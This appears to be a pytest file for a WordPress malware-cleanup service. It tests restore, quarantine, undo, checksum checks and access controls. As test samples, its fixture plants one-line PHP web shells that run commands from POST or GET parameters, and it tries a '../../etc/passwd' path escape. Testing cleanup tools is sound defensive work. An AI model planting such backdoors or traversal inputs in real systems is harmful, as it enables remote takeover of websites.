"""Remediation: genuine-file restore and quarantine through a separate write login, only by the assigned engineer
on an authorised request, with a fingerprint check, an encrypted backup, verification, undo and a full record."""

from __future__ import annotations

import socket

import httpx
import pytest
from sqlalchemy import select

from app.core.config import get_settings
from app.core.http import set_transport_factory
from app.db.session import platform_session
from app.models import AuditEvent, RemediationAction
from tests.conftest import run_dispatched
from tests.test_monitoring_flow import _connect, _scan, _website
from tests.test_security import _staff
from tests.test_vendor import CORE_FILES, PLUGIN_FILES, FakeWordPressOrg, wp_site  # noqa: F401 - fixture

FIXER = ("fixer", "Write-Access-Pass-7")


class FakeWordPressWithFiles(FakeWordPressOrg):
    def __init__(self):
        super().__init__()
        self.tamper = False

    def handler(self, request: httpx.Request) -> httpx.Response:
        host = request.headers["host"]
        path = request.url.path
        if host == "core.svn.wordpress.org" and path.startswith("/tags/6.7.1/"):
            rel = path[len("/tags/6.7.1/"):]
            if rel in CORE_FILES:
                body = CORE_FILES[rel] + ("// injected in transit\n" if self.tamper else "")
                return httpx.Response(200, content=body.encode())
            return httpx.Response(404)
        if host == "plugins.svn.wordpress.org" and path.startswith("/hello-dolly/tags/1.7.2/"):
            rel = path[len("/hello-dolly/tags/1.7.2/"):]
            return httpx.Response(200, content=PLUGIN_FILES[rel].encode()) if rel in PLUGIN_FILES else httpx.Response(404)
        return super().handler(request)


@pytest.fixture
def wporg_files(monkeypatch):
    fake = FakeWordPressWithFiles()
    real = socket.getaddrinfo
    hosts = ("api.wordpress.org", "downloads.wordpress.org", "core.svn.wordpress.org", "plugins.svn.wordpress.org")

    def resolve(host, port, *a, **k):
        if host in hosts:
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("198.143.164.251", port))]
        return real(host, port, *a, **k)

    monkeypatch.setattr(socket, "getaddrinfo", resolve)
    monkeypatch.setattr(get_settings(), "vendor_checksums_enabled", True)
    set_transport_factory(lambda: httpx.MockTransport(fake.handler))
    yield fake
    set_transport_factory(None)


@pytest.fixture
def hacked(alice, sftp_server, wp_site, wporg_files):  # noqa: F811
    """A scanned WordPress site with a tampered core file and a planted file, plus an authorised cleanup request
    assigned to an engineer who holds the access grant."""
    sess, tid = alice
    (wp_site / "wp-admin" / "index.php").write_text("<?php require_once __DIR__ . '/admin.php'; @eval($_POST['x']);\n")
    (wp_site / "wp-includes" / "class-wp-cache-helper.php").write_text("<?php @system($_GET['c']);\n")
    acct = _connect(sess, tid, sftp_server)
    wid = _website(sess, tid, acct)
    assert _scan(sess, tid, wid) == ["succeeded"]
    sftp_server.state.extra_logins[FIXER[0]] = FIXER[1]
    sftp_server.state.write_users.add(FIXER[0])
    r = sess.put(f"/api/v1/tenants/{tid}/hosting-accounts/{acct}/remediation-access", json={
        "hostname": "127.0.0.1", "port": sftp_server.port, "username": FIXER[0], "root_path": "/public_html",
        "credential": {"kind": "password", "value": FIXER[1]}})
    assert r.status_code == 200 and r.json()["status"] == "ok", r.json()
    assert "matches the monitored folder" in r.json()["last_result"]
    t = sess.post(f"/api/v1/tenants/{tid}/tickets", json={"subject": "Hacked", "category": "malware_cleanup",
                                                          "body": "Please clean", "website_id": wid}).json()
    eng = _staff("engineer@trustdata.example.com", ["support_agent"])
    eng.post(f"/api/v1/ops/service-desk/{t['id']}/assign", json={})
    sess.post(f"/api/v1/tenants/{tid}/tickets/{t['id']}/remediation-approval",
              json={"scope": "Clean the WordPress site; restore genuine files.", "confirm": True})
    return {"sess": sess, "tid": tid, "acct": acct, "wid": wid, "ticket": t["id"], "eng": eng, "site": wp_site,
            "server": sftp_server, "wporg": wporg_files}


def _cands(h):
    r = h["eng"].get(f"/api/v1/ops/service-desk/{h['ticket']}/remediation").json()
    assert r["blocked"] is None, r
    return {c["path"]: c for c in r["candidates"]}


def _act(h, action, path, sha):
    return h["eng"].post(f"/api/v1/ops/service-desk/{h['ticket']}/remediation/actions",
                         json={"action": action, "path": path, "expected_sha256": sha})


def test_restore_quarantine_and_undo(hacked):
    h = hacked
    cands = _cands(h)
    core, planted = cands["wp-admin/index.php"], cands["wp-includes/class-wp-cache-helper.php"]
    assert core["actions"] == ["restore_genuine"] and "differs from the official" in " ".join(core["reasons"])
    assert planted["actions"] == ["quarantine"]

    r = _act(h, "restore_genuine", core["path"], core["sha256"])
    assert r.status_code == 200, r.text
    assert (h["site"] / "wp-admin" / "index.php").read_text() == CORE_FILES["wp-admin/index.php"]
    assert "checksum verified" in r.json()["source"]
    r = _act(h, "quarantine", planted["path"], planted["sha256"])
    assert r.status_code == 200, r.text
    assert not (h["site"] / "wp-includes" / "class-wp-cache-helper.php").exists()
    assert not h["server"].state.write_attempts, "the monitoring login never wrote; only the remediation login did"
    assert not [p for p in h["server"].state.writes if ".cyberwatch-" in p and p.endswith(".tmp")
                and (h["site"] / p.lstrip("/").removeprefix("public_html/")).exists()]

    # The customer sees both changes on the request, and can undo them.
    sess, tid = h["sess"], h["tid"]
    mine = sess.get(f"/api/v1/tenants/{tid}/tickets/{h['ticket']}/remediation").json()["actions"]
    assert {a["action"] for a in mine} == {"restore_genuine", "quarantine"} and all(a["can_undo"] for a in mine)
    q = next(a for a in mine if a["action"] == "quarantine")
    assert sess.post(f"/api/v1/tenants/{tid}/tickets/{h['ticket']}/remediation/{q['id']}/undo").status_code == 200
    assert (h["site"] / "wp-includes" / "class-wp-cache-helper.php").read_text() == "<?php @system($_GET['c']);\n"
    rest = next(a for a in mine if a["action"] == "restore_genuine")
    r = h["eng"].post(f"/api/v1/ops/service-desk/{h['ticket']}/remediation/actions/{rest['id']}/undo")
    assert r.status_code == 200, r.text
    assert "@eval" in (h["site"] / "wp-admin" / "index.php").read_text()

    with platform_session() as db:
        actions = {e.action for e in db.execute(select(AuditEvent).where(AuditEvent.action.like("remediation.%"))).scalars()}
        assert {"remediation.restore_genuine", "remediation.quarantine", "remediation.undone"} <= actions
        # Backups are encrypted at rest.
        a = db.execute(select(RemediationAction).where(RemediationAction.action == "quarantine")).scalar_one()
        from app.services import storage

        assert b"system" not in storage.get(a.tenant_id, a.backup_key)
    run_dispatched()  # the rescans queued after each change run cleanly


def test_file_changed_since_scan_is_never_overwritten(hacked):
    h = hacked
    core = _cands(h)["wp-admin/index.php"]
    (h["site"] / "wp-admin" / "index.php").write_text("<?php // the customer's developer edited this just now\n")
    r = _act(h, "restore_genuine", core["path"], core["sha256"])
    assert r.status_code == 422 and r.json()["error"]["code"] == "stale"
    assert "developer edited" in (h["site"] / "wp-admin" / "index.php").read_text()
    with platform_session() as db:
        assert db.execute(select(RemediationAction)).first() is None


def test_official_copy_failing_its_checksum_is_refused(hacked):
    h = hacked
    h["wporg"].tamper = True
    core = _cands(h)["wp-admin/index.php"]
    r = _act(h, "restore_genuine", core["path"], core["sha256"])
    assert r.status_code == 422 and r.json()["error"]["code"] == "checksum_mismatch"
    assert "@eval" in (h["site"] / "wp-admin" / "index.php").read_text()


def test_only_the_assigned_engineer_on_an_authorised_open_request(hacked, sftp_server):
    h = hacked
    core = _cands(h)["wp-admin/index.php"]
    other = _staff("other@trustdata.example.com", ["soc_analyst"])
    r = other.post(f"/api/v1/ops/service-desk/{h['ticket']}/remediation/actions",
                   json={"action": "restore_genuine", "path": core["path"], "expected_sha256": core["sha256"]})
    assert r.status_code == 422 and "assigned" in r.json()["error"]["message"]
    assert other.get(f"/api/v1/ops/service-desk/{h['ticket']}/remediation").json()["candidates"] == [], \
        "file lists are site data: only for the grant holder"
    # Core files are restored, never removed.
    r = _act(h, "quarantine", core["path"], core["sha256"])
    assert r.status_code == 422
    # Path escapes are refused before anything connects.
    assert _act(h, "quarantine", "../../etc/passwd", "0" * 64).status_code == 422
    # Once the request is closed, nothing can be changed.
    h["sess"].post(f"/api/v1/tenants/{h['tid']}/tickets/{h['ticket']}/close")
    r = _act(h, "restore_genuine", core["path"], core["sha256"])
    assert r.status_code == 422 and "not open" in r.json()["error"]["message"]


def test_remediation_access_setup_rules(alice, sftp_server, wp_site, wporg_files):  # noqa: F811
    sess, tid = alice
    acct = _connect(sess, tid, sftp_server)
    url = f"/api/v1/tenants/{tid}/hosting-accounts/{acct}/remediation-access"
    sftp_server.state.extra_logins[FIXER[0]] = FIXER[1]
    base = {"hostname": "127.0.0.1", "port": sftp_server.port, "username": FIXER[0],
            "credential": {"kind": "password", "value": FIXER[1]}}
    # Read-only login: the write test fails and access is not usable.
    r = sess.put(url, json=base | {"root_path": "/public_html"})
    assert r.json()["status"] == "failed" and "write" in r.json()["last_result"].lower()
    sftp_server.state.write_users.add(FIXER[0])
    # The wrong folder is caught by comparing with the monitored one.
    assert sess.put(url, json=base | {"root_path": "/"}).status_code == 422, "the whole server is never a root"
    r = sess.put(url, json=base | {"root_path": "/public_html/wp-content"})
    assert r.json()["status"] == "failed" and "does not look like the monitored folder" in r.json()["last_result"]
    r = sess.put(url, json=base | {"root_path": "/public_html"})
    assert r.json()["status"] == "ok" and r.json()["host_key_fingerprint"].startswith("SHA256:")
    assert FIXER[1] not in r.text
    assert sess.put(url, json=base | {"root_path": "relative/path"}).status_code == 422
    assert sess.put(url, json=base | {"root_path": "/public_html", "credential": {"kind": "api_token", "value": "x"}}).status_code == 422
    # Staff, even with a grant, cannot give themselves write access (hosting management is not grantable).
    eng = _staff("eng2@trustdata.example.com", ["platform_admin"])
    assert eng.put(url, json=base | {"root_path": "/public_html"}).status_code in (403, 404)
    assert sess.delete(url).json() == {"configured": False}
    assert sess.get(url).json() == {"configured": False}


def test_backups_are_deleted_after_90_days_but_the_record_stays(hacked):
    from datetime import timedelta

    from app.db.base import utcnow
    from app.services import storage
    from app.services.retention import run_retention

    h = hacked
    planted = _cands(h)["wp-includes/class-wp-cache-helper.php"]
    assert _act(h, "quarantine", planted["path"], planted["sha256"]).status_code == 200
    with platform_session() as db:
        a = db.execute(select(RemediationAction)).scalar_one()
        key, tenant = a.backup_key, a.tenant_id
        a.performed_at = utcnow() - timedelta(days=91)
        db.commit()
        assert run_retention(db)["remediation_backups"] == 1
        db.commit()
    with platform_session() as db:
        a = db.execute(select(RemediationAction)).scalar_one()
        assert a.backup_key is None and a.status == "done"
    with pytest.raises(storage.StorageError):
        storage.get(tenant, key)
    mine = h["sess"].get(f"/api/v1/tenants/{h['tid']}/tickets/{h['ticket']}/remediation").json()["actions"]
    assert mine[0]["can_undo"] is False


def test_file_of_a_wordpress_install_in_a_subfolder_is_restored_from_its_own_release(
        alice, sftp_server, wp_site, wporg_files):  # noqa: F811
    """Production case: a second WordPress in e-adamawa/ inside the root install. Its readme.html must be looked
    up as readme.html of that install, not as e-adamawa/readme.html of the root one."""
    sess, tid = alice
    sub = wp_site / "e-adamawa"
    for rel, content in CORE_FILES.items():
        (sub / rel).parent.mkdir(parents=True, exist_ok=True)
        (sub / rel).write_text(content)
    (sub / "wp-admin" / "index.php").write_text("<?php // tampered in the subfolder site\n")
    acct = _connect(sess, tid, sftp_server)
    wid = _website(sess, tid, acct)
    assert _scan(sess, tid, wid) == ["succeeded"]
    sftp_server.state.extra_logins[FIXER[0]] = FIXER[1]
    sftp_server.state.write_users.add(FIXER[0])
    sess.put(f"/api/v1/tenants/{tid}/hosting-accounts/{acct}/remediation-access", json={
        "hostname": "127.0.0.1", "port": sftp_server.port, "username": FIXER[0], "root_path": "/public_html",
        "credential": {"kind": "password", "value": FIXER[1]}})
    t = sess.post(f"/api/v1/tenants/{tid}/tickets", json={"subject": "Fix", "category": "malware_cleanup",
                                                          "body": "x", "website_id": wid}).json()
    eng = _staff("nested@trustdata.example.com", ["support_agent"])
    eng.post(f"/api/v1/ops/service-desk/{t['id']}/assign", json={})
    eng.post(f"/api/v1/ops/service-desk/{t['id']}/assign", json={})  # re-assigning the same person: no-op
    sess.post(f"/api/v1/tenants/{tid}/tickets/{t['id']}/remediation-approval",
              json={"scope": "Restore genuine files in both WordPress sites.", "confirm": True})
    h = {"eng": eng, "ticket": t["id"]}
    c = _cands(h)["e-adamawa/wp-admin/index.php"]
    r = _act(h, "restore_genuine", c["path"], c["sha256"])
    assert r.status_code == 200, r.text
    assert (sub / "wp-admin" / "index.php").read_text() == CORE_FILES["wp-admin/index.php"]
    assert "/tags/6.7.1/wp-admin/index.php" in r.json()["source"]
    timeline = eng.get(f"/api/v1/ops/service-desk/{t['id']}").json()["messages"]
    assert sum(1 for m in timeline if m["body"].startswith("Assigned to")) == 1


def test_compare_file_command_reports_identical_bytes(hacked, capsys):
    from app import cli

    cli.main(["compare-file", "alpha-site.com", "wp-admin/index.php"])
    out = capsys.readouterr().out
    assert "IDENTICAL" in out and "via SFTP (real)" in out
